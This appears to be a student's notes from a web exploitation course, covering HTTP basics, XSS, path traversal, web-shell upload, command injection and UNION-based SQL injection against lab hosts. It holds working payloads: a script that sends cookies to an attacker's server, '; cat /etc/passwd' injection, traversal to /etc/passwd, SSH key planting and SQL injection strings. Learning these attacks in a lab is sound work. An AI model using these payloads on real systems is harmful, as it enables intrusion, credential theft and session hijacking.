sudo tcpdump -XXvvnni any tcp port 80 -A
---------------------------------------------------------------------------------------------------------------------------------------------------
HTTP Methods
GET
POST


HTTP Response codes:
10X = informational
2XX = Success
30X = Redirection
4XX = Client Error
5XX = Server Error

HTTP Fields:
User-agent    -->    whatever was used to communicate with the server. e.g. wget, curl, etc
Referer    -->    Beyond the scope of COSC Security, apparently
Cookie    -->    
Date    -->    Sorry, not interested
Server    -->    What software the server is using
Set-cookie    -->    How the server tells the client to interpret certain info
---------------------------------------------------------------------------------------------------------------------------------------------------
Utilize the URL to create a get request:
http://10.50.x.x/path/pathdemo.php?myfile=demo1

Wget:    --    Only use with FTP
wget -r -l2 -P /tmp ftp://ftpserver/

cURL
    - Not recursive
    - Can use pipes
    - Upload ability
    - Supports more protocols vs Wget, such as SCP & POP3
VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
---------------------------------------------------------------------------------------------------------------------------------------------------
JavaScript (JS)
    - Allows websites to interact with the client
        - JavaScript runs on the client’s machine
    - Coded as .js files, or in-line of HTML

JS Interaction

<script>
function myFunction() {
    document.getElementById("demo").innerHTML = "Paragraph changed.";
}
</script>
<script src="https://www.w3schools.com/js/myScript1.js"></script>
---------------------------------------------------------------------------------------------------------------------------------------------------
Enumeration:
    Robots.txt
    Legitimate surfing
    Tools;
        - NSE scripts
        - Nikto
        - Burp suite (outside class)


Cross-Site Scripting (XSS) Overview:
    - Insertion of arbitrary code into a webpage, that executes in the browser of visitors
    - Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
    - Often found in forums that allow HTML

Reflected XSS:
    Most common form of XSS
    occurs in error messages or search results
    delivered through intermediate media, like a link in an email
    Characters that are normally illegal in URLs can be Base64 encoded

Stored XSS:
    - Resides on vulnerable site
    - Only requires user to visit page
<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">

Useful JavaScript Components:
Proof of concept (simple alert);
<script>alert('XSS');</script>
  - Capturing Cookies
    `document.cookie`

  - Capturing Keystrokes
      ~ bind `KEYDOWN` and `KEYUP`

  - Capturing Sensitive Data
    `document.body.innerHTML`
---------------------------------------------------------------------------------------------------------------------------------------------------

Server-Side injection:

Directory Traversal/Path Traversal
    - Ability to read/execute outside web server’s directory
    - Uses ../../ (relative paths) in manipulating a server-side file path
view_image.php?file=../../etc/passwd

Malicious File Upload:
Site allows unsanitized file uploads;
    - Server doesn’t validate extension or size
    - Allows for code execution (shell)
    - Once uploaded
        ~ Find your file
        ~ Call your file

Command Injection:    --    Application on the server is vulnerable, allowing execution of arbitrary commands

Might contain the following in it’s code:
`system("ping -c 1 ".$_GET["ip"]);`
Run the following to chain/stack our arbitrary command:
`; cat /etc/passwd`
=====================================================================================================================

Enumerate website
robots.txt
directories:
/uploads
/chat
/cmdinjection
/java
/path
/webexample

from surfing:
- Can upload file?

Tools:
Nmap:
robots.txt
/java
/path
/uploads
Nikto:
nikto v -h 10.50.28.11

/uploads has thingy.php that provides a shell 
Main page allows file upload; uploaded web shell to server. File name is /uploads/thingy.php

ssh-keygen to create public-private key pair

echo "<key>" >> /var/www/.ssh/authorized_keys

ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 2121




../../../../../../../etc/passwd

base for grabbing a cookie:
<script>alert('XSS!');</script>

python3 -m http.server
<script>document.location="http://<`ip:port`>/?" + document.cookie;</script>
##################################################################################################################################################################################
---------------------------------------------------------------------------------SQL INJECTION------------------------------------------------------------------------------------
##################################################################################################################################################################################
SELECT    -    Extracts data from a database

UNION    -    Used to combine the result-set of two or more SELECT statements

USE    -    Selects the DB to use

UPDATE    -    Updates data in a database

DELETE    -    Deletes data from a database

INSERT INTO    -    Inserts new data into a database

CREATE DATABASE    -    Creates a new database

ALTER DATABASE    -    Modifies a database

CREATE TABLE    -    Creates a new table

ALTER TABLE    -    Modifies a table

DROP TABLE
	

Deletes a table

CREATE INDEX
	

Creates an index (search key)

DROP INDEX
	

Deletes an index

To gain access to an SQL database within a server, type:
mysql

show SQL Databases:
    Show databases ;

default databases:
    - inforation_schema
    - mysql
    - performance_schema

to switch Databases:
    use <DB NAME> ;

see the column named 'columns' from the table named 'columns':
    show columns from columns

grabs nested items within the table `columns` from the database `information_schema`:
    select table_schema,table_name,column_name from information_schema.columns ;
SYNTAX:                                             database^ table viewed^
    select <information bank> from <database> . <table> ;

Change a session:
    use <database> ;

shows what tables are in a database:
    show tables from <database> ;

DESCRIPTION:
    select username,passwd,studentID from session.userinfo ;

    select name,cost,color,from session.car
    select name,size,cost from session.Tires
--------------------------------------------------------------------------------------------------------------------------------------
DEMO

Input THIS EXACT truth statement into login and password field:
' OR 1='1
Go to Network tab and log in
add ? to end of URL. Copy&paste raw string from POST request against it
This will bring you to a page with (for this course) credentials

Test fields to see what is vulnerable:
Do 'fuzzing'. Just kinda mess around a bit
one or more of a field may be misconfigured
<field>' OR 1='1

Identify number of columns
Audi' UNION SELECT 1,2,3,4,5 #

Audi 'UNION SELECT table_schema, 2, table_name, column_name, 5 from information_schema.columns #
[Audi 'UNION SELECT table_schema, table_name, 3, column_name, 5 from information_schema.columns #]

find other DB & modify golden statment as fit:
Audi 'UNION SELECT type,2,cost,color,year from session.car #

Audi 'UNION SELECT carid,2,type,name,year from session.car #

Databases:
session
    Tables: Tires
        Column names: Tireid
                      Name
                      size
                      cost
            Car











                                                        




















